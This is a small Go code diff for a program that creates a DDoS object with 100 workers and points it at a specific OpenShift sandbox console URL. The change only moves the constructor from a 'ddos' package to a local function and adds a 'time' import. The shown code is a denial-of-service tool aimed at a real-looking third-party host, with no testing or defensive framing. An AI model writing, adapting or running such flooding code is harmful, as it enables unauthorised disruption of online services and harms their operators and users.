@@ -9,6 +9,7 @@ import (
 	"net/url"
 	"runtime"
 	"sync/atomic"
+	"time"
 )
 
 var port = os.Getenv("PORT")
@@ -20,7 +21,7 @@ func main() {
 	fmt.Println("helloooo")
 
         workers := 100
-	d, err := ddos.New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
+	d, err := New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
 	if err != nil {
 		panic(err)
 	}
